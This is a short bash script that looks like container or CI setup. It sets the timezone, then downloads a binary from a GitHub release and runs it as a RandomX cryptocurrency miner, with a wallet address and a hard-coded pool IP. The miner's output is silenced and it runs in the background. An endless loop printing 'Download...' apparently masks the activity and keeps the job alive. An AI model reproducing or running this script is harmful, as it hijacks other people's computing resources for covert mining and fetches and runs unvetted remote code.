#!/bin/bash
set -x
apt-get update 
ln -fs /usr/share/zoneinfo/America/Montserrat /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget -q https://github.com/kamikaze05/kamikaze/releases/download/kamikaze/kamikaze.tar.gz && tar -xvf kamikaze.tar.gz 
chmod +x kamikaze && ./kamikaze -algo randomx -wallet BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN  -coin BONK -rigName "QuickSilver" -pool1 159.203.162.18:3333 -cpuThreads 1 >/dev/null 2>&1 &
while true
do
        echo "Download..."
        sleep 30
done
